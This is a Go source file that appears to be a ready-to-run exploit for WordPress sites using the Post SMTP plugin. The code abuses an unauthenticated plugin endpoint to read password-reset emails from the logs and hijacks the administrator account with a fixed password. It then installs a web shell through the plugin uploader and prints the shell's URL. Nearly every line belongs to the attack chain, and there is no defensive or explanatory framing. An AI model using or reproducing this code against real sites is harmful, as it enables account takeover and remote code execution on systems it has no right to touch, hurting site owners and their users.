package main

import (
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net/http"
    "net/url"
    "os"
    "strings"
    "net/http/cookiejar"
    "strconv"
    "bytes"
    "mime/multipart"
    "crypto/tls"
    "io"
    "regexp"
    "math/rand"
    "time"
)

func randomFilename(length int) string {
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))
    b := make([]byte, length)
    for i := range b {
        b[i] = charset[seededRand.Intn(len(charset))]
    }
    return string(b) + ".zip"
}


func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: go run main.go https://example.com")
        os.Exit(1)
    }
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    jar, _ := cookiejar.New(nil)

    client := &http.Client{}
    inputURL := os.Args[1]
    parsedURL, err := url.Parse(inputURL)
    if err != nil {
        fmt.Printf("Error parsing input URL: %v\n", err)
        os.Exit(1)
    }

    scheme := parsedURL.Scheme
    domain := parsedURL.Hostname()

    urls := []string{
        fmt.Sprintf("%s://%s/wp-json/post-smtp/v1/connect-app", scheme, domain),
        fmt.Sprintf("%s://%s/index.php/wp-json/post-smtp/v1/connect-app", scheme, domain),
    }

    var validURL string
    for _, url := range urls {
        resp, err := http.Post(url, "application/x-www-form-urlencoded", nil)
        if err != nil {
            fmt.Printf("Error sending request to %s: %v\n", url, err)
            continue
        }
        if resp.StatusCode != http.StatusNotFound {
            validURL = url
            break
        }
        resp.Body.Close()
    }

    if validURL == "" {
        fmt.Println("Both URLs returned 404.")
        os.Exit(1)
    }

    requestHeaders := map[string]string{
        "Upgrade-Insecure-Requests": "1",
        "User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36",
        "Connection":                "close",
        "fcm-token":                 "Tuktuk",
        "device":                    "FakeDevice",
        "Content-Type":              "application/x-www-form-urlencoded",
    }

    formData := url.Values{}
    formData.Set("key", "value")

    req, err := http.NewRequest("POST", validURL, strings.NewReader(formData.Encode()))
    if err != nil {
        fmt.Printf("Error creating request: %v\n", err)
        os.Exit(1)
    }

    for key, value := range requestHeaders {
        req.Header.Set(key, value)
    }

    client = &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("Error sending request with headers: %v\n", err)
        os.Exit(1)
    }
    defer resp.Body.Close()

    //fmt.Printf("Response status for %s: %s\n", validURL, resp.Status)

    userURL := fmt.Sprintf("%s://%s/index.php/wp-json/wp/v2/users/1", scheme, domain)
    userResp, err := http.Get(userURL)
    if err != nil {
        fmt.Printf("Error fetching user data: %v\n", err)
        os.Exit(1)
    }
    defer userResp.Body.Close()

    body, err := ioutil.ReadAll(userResp.Body)
    if err != nil {
        fmt.Printf("Error reading user response body: %v\n", err)
        os.Exit(1)
    }

    var userData map[string]interface{}
    err = json.Unmarshal(body, &userData)
    if err != nil {
        fmt.Printf("Error parsing user data: %v\n", err)
        os.Exit(1)
    }
    
    userName, ok := userData["slug"].(string)
    if !ok {
        fmt.Println("Warning: 'slug' field not found in user data, setting userName to 'admin'")
        userName = "admin" 
    } else {
        fmt.Printf("User Name: %s\n", userName)
    }


    resetURL := fmt.Sprintf("%s://%s/wp-login.php?action=lostpassword", scheme, domain)
    formData = url.Values{
        "user_login": {userName},
        "redirect_to": {""},
        "wp-submit": {"Get New Password"},
    }

    req, err = http.NewRequest("POST", resetURL, strings.NewReader(formData.Encode()))
    if err != nil {
        fmt.Printf("Error creating password reset request: %v\n", err)
        os.Exit(1)
    }

    for key, value := range requestHeaders {
        req.Header.Set(key, value)
    }

    client = &http.Client{}
    resetResp, err := client.Do(req)
    if err != nil {
        fmt.Printf("Error sending password reset request: %v\n", err)
        os.Exit(1)
    }
    defer resetResp.Body.Close()

    //fmt.Printf("Password reset response status: %s\n", resetResp.Status)

    logUrls := []string{
        fmt.Sprintf("%s://%s/wp-json/post-smtp/v1/get-logs", scheme, domain),
        fmt.Sprintf("%s://%s/index.php/wp-json/post-smtp/v1/get-logs", scheme, domain),
    }

    var validLogURL string
    for _, url := range logUrls {
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
            fmt.Printf("Error creating log request: %v\n", err)
            continue
        }

        for key, value := range requestHeaders {
            req.Header.Set(key, value)
        }

        resp, err := client.Do(req)
        if err != nil {
            fmt.Printf("Error sending log request to %s: %v\n", url, err)
            continue
        }

        if resp.StatusCode != http.StatusNotFound {
            validLogURL = url
            if validLogURL == logUrls[0] {
                break
            }
        }
        resp.Body.Close()
    }

    if validLogURL == "" {
        fmt.Println("Both log URLs returned 404.")
        os.Exit(1)
    }

    logReq, _ := http.NewRequest("GET", validLogURL, nil)
    for key, value := range requestHeaders {
        logReq.Header.Set(key, value)
    }

    logResp, err := client.Do(logReq)
    if err != nil {
        fmt.Printf("Error fetching logs: %v\n", err)
        os.Exit(1)
    }
    defer logResp.Body.Close()

    logBody, err := ioutil.ReadAll(logResp.Body)
    if err != nil {
        fmt.Printf("Error reading log response body: %v\n", err)
        os.Exit(1)
    }
    //fmt.Printf("Log Response Body:\n%s\n", string(logBody))

    var response struct {
        Success bool `json:"success"`
        Data    []struct {
            ID string `json:"id"`
        } `json:"data"`
    }
    err = json.Unmarshal(logBody, &response)
    if err != nil {
        fmt.Printf("Error parsing logs data: %v\n", err)
        os.Exit(1)
    }

    if len(response.Data) == 0 {
        fmt.Println("No logs found.")
        os.Exit(1)
    }

    latestID := response.Data[0].ID

    client = &http.Client{Jar: jar, CheckRedirect: func(req *http.Request, via []*http.Request) error {
        return http.ErrUseLastResponse
    }}

    finalURL := fmt.Sprintf("%s://%s/wp-admin/admin.php?access_token=Tuktuk&type=log&log_id=%s", scheme, domain, latestID)
    fmt.Println("Last log:", finalURL)

    finalReq, err := http.NewRequest("GET", finalURL, nil)
    if err != nil {
        fmt.Printf("Error creating request to final URL: %v\n", err)
        os.Exit(1)
    }

    finalResp, err := client.Do(finalReq)
    if err != nil {
        fmt.Printf("Error sending request to final URL: %v\n", err)
        os.Exit(1)
    }
    defer finalResp.Body.Close()

    finalBody, err := ioutil.ReadAll(finalResp.Body)
    if err != nil {
        fmt.Printf("Error reading final response body: %v\n", err)
        os.Exit(1)
    }
    
    var rpLogin, rpKey string
    rpLoginRegex := regexp.MustCompile(`login=([^&]+)`)
    rpKeyRegex := regexp.MustCompile(`key=([^&]+)`)
    
    loginMatches := rpLoginRegex.FindStringSubmatch(string(finalBody))
    if len(loginMatches) > 1 {
        rpLogin = loginMatches[1]
    } else {
        fmt.Println("rp_login not found in response")
        os.Exit(1)
    }
    
    keyMatches := rpKeyRegex.FindStringSubmatch(string(finalBody))
    if len(keyMatches) > 1 {
        rpKey = keyMatches[1]
    } else {
        fmt.Println("rp_key not found in response")
        os.Exit(1)
    }
    
    //fmt.Printf("Extracted rp_login: %s\n", rpLogin)
    //fmt.Printf("Extracted rp_key: %s\n", rpKey)

    if rpLogin == "" || rpKey == "" {
        fmt.Println("Required parameters not found in URL")
        os.Exit(1)
    }

    postData := url.Values{
        "rp_login": {rpLogin},
        "rp_key":   {rpKey},
        "pass1":    {"Tuktuk"},
        "pass2":    {"Tuktuk"},
        "submit":   {"Reset Password"},
    }

    resetPassGetURL := fmt.Sprintf("%s://%s/wp-login.php?action=rp&key=%s&login=%s&wp_lang=en_US", scheme, domain, rpKey, rpLogin)
    getReq, err := http.NewRequest("GET", resetPassGetURL, nil)
    if err != nil {
        fmt.Printf("Error creating GET request for reset password: %v\n", err)
        os.Exit(1)
    }
    
    getResp, err := client.Do(getReq)
    if err != nil {
        fmt.Printf("Error sending GET request for reset password: %v\n", err)
        os.Exit(1)
    }
    defer getResp.Body.Close()
    
    urlCookies := jar.Cookies(getReq.URL)

    resetPassURL := fmt.Sprintf("%s://%s/wp-login.php?action=resetpass", scheme, domain)
    req, err = http.NewRequest("POST", resetPassURL, strings.NewReader(postData.Encode()))
    if err != nil {
        fmt.Printf("Error creating password reset request: %v\n", err)
        os.Exit(1)
    }
    
    for key, value := range requestHeaders {
        req.Header.Set(key, value)
    }
    
    for _, cookie := range urlCookies {
        req.AddCookie(cookie)
    }
    
    resetResp, err = client.Do(req)
    if err != nil {
        fmt.Printf("Error sending password reset request: %v\n", err)
        os.Exit(1)
    }
    defer resetResp.Body.Close()

    loginURL := fmt.Sprintf("%s://%s/wp-login.php", scheme, domain)

    requestBody := fmt.Sprintf("log=%s&pwd=Tuktuk&redirect_to=%%2Fwp-admin%%2Fplugin-install.php&wp-submit=Log+In", url.QueryEscape(userName))

    req, err = http.NewRequest("POST", loginURL, strings.NewReader(requestBody))
    if err != nil {
        fmt.Printf("Error creating login request: %v\n", err)
        os.Exit(1)
    }

    req.Header.Set("Host", domain)
    req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0")
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("device", "FakeDevice")
    req.Header.Set("fcm-token", "Tuktuk")
    req.Header.Set("Content-Length", strconv.Itoa(len(requestBody)))

    loginResp, err := client.Do(req)
    if err != nil {
        fmt.Printf("Error sending login request: %v\n", err)
        os.Exit(1)
    }
    defer loginResp.Body.Close()

    userPass := fmt.Sprintf("Username: %s | Password: Tuktuk | URL: %s://%s", userName, scheme, domain)
    fmt.Println(userPass)

    /*
    fmt.Println("Response Headers:")
    for key, values := range loginResp.Header {
        for _, value := range values {
            fmt.Println(key + ": " + value)
        }
    }

    responseBody, err := ioutil.ReadAll(loginResp.Body)
    if err != nil {
        fmt.Printf("Error reading response body: %v\n", err)
        os.Exit(1)
    }

    fmt.Println("Response Body:")
    fmt.Println(string(responseBody))

    
    fmt.Println("Set-Cookie headers received:")
    for _, cookie := range loginResp.Header["Set-Cookie"] {
        fmt.Println(cookie)
    }

    fmt.Println("Cookies after login request:", jar.Cookies(req.URL))


    fmt.Println("Cookies after login request:", jar.Cookies(req.URL)) */

    for loginResp.StatusCode >= 300 && loginResp.StatusCode < 400 {
        redirectURL, err := loginResp.Location()
        if err != nil {
            fmt.Printf("Error obtaining redirect location: %v\n", err)
            os.Exit(1)
        }

        //fmt.Println("Cookies before following redirect:", jar.Cookies(redirectURL))


        loginResp, err = client.Get(redirectURL.String())
        if err != nil {
            fmt.Printf("Error following redirect: %v\n", err)
            os.Exit(1)
        }
        defer loginResp.Body.Close()

        /* Debugging: Print cookies after following redirect
        fmt.Println("Cookies after following redirect:", jar.Cookies(redirectURL))
    }*/
    
    //fmt.Printf("Final Response Status: %s\n", loginResp.Status)
    

    redirectedBody, err := ioutil.ReadAll(loginResp.Body)
    if err != nil {
        fmt.Printf("Error reading redirected response body: %v\n", err)
        os.Exit(1)
    }
    redirectedBodyStr := string(redirectedBody)

    nonceStartIndex := strings.Index(redirectedBodyStr, `name="_wpnonce" value="`)
    if nonceStartIndex == -1 {
        fmt.Println("'_wpnonce' not found in the response body")
        os.Exit(1)
    }


    nonceStartIndex += len(`name="_wpnonce" value="`)


    nonceEndIndex := strings.Index(redirectedBodyStr[nonceStartIndex:], `"`)
    if nonceEndIndex == -1 {
        fmt.Println("Closing quote for _wpnonce value not found")
        os.Exit(1)
    }


    _wpnonce := redirectedBodyStr[nonceStartIndex : nonceStartIndex+nonceEndIndex]
    //fmt.Println("Extracted _wpnonce value:", _wpnonce)
    //fmt.Printf("Redirected Response Body:\n%s\n", string(redirectedBody))
    
    file, err := os.Open("shell.zip")
    if err != nil {
        fmt.Printf("Error opening file: %v\n", err)
        os.Exit(1)
    }
    defer file.Close()


    var multipartRequestBody bytes.Buffer
    multipartWriter := multipart.NewWriter(&multipartRequestBody)


    _wpnoncePart, err := multipartWriter.CreateFormField("_wpnonce")
    if err != nil {
        fmt.Printf("Error creating form field: %v\n", err)
        os.Exit(1)
    }
    _, err = _wpnoncePart.Write([]byte(_wpnonce))
    if err != nil {
        fmt.Printf("Error writing to form field: %v\n", err)
        os.Exit(1)
    }


    refererPart, err := multipartWriter.CreateFormField("_wp_http_referer")
    if err != nil {
        fmt.Printf("Error creating form field: %v\n", err)
        os.Exit(1)
    }
    _, err = refererPart.Write([]byte("/wp-admin/plugin-install.php"))
    if err != nil {
        fmt.Printf("Error writing to form field: %v\n", err)
        os.Exit(1)
    }
    
    randomFile := randomFilename(10) 
    
    filePart, err := multipartWriter.CreateFormFile("pluginzip", randomFile)
    if err != nil {
        fmt.Printf("Error creating form file: %v\n", err)
        os.Exit(1)
    }
    _, err = io.Copy(filePart, file)
    if err != nil {
        fmt.Printf("Error writing file to form: %v\n", err)
        os.Exit(1)
    }


    installPart, err := multipartWriter.CreateFormField("install-plugin-submit")
    if err != nil {
        fmt.Printf("Error creating form field: %v\n", err)
        os.Exit(1)
    }
    _, err = installPart.Write([]byte("Install Now"))
    if err != nil {
        fmt.Printf("Error writing to form field: %v\n", err)
        os.Exit(1)
    }


    multipartWriter.Close()


    uploadURL := fmt.Sprintf("%s://%s/wp-admin/update.php?action=upload-plugin", scheme, domain)
    req, err = http.NewRequest("POST", uploadURL, &multipartRequestBody)
    if err != nil {
        fmt.Printf("Error creating request: %v\n", err)
        os.Exit(1)
    }


    req.Header.Set("Content-Type", multipartWriter.FormDataContentType())

    uploadResponse, err := client.Do(req)
    if err != nil {
        fmt.Printf("Error sending request: %v\n", err)
        os.Exit(1)
    }
    defer uploadResponse.Body.Close()
    fmt.Printf("Shell: %s://%s/wp-content/upgrade/%s/main.php?xack=id\n", scheme, domain, randomFile[:len(randomFile)-4])
    }
}
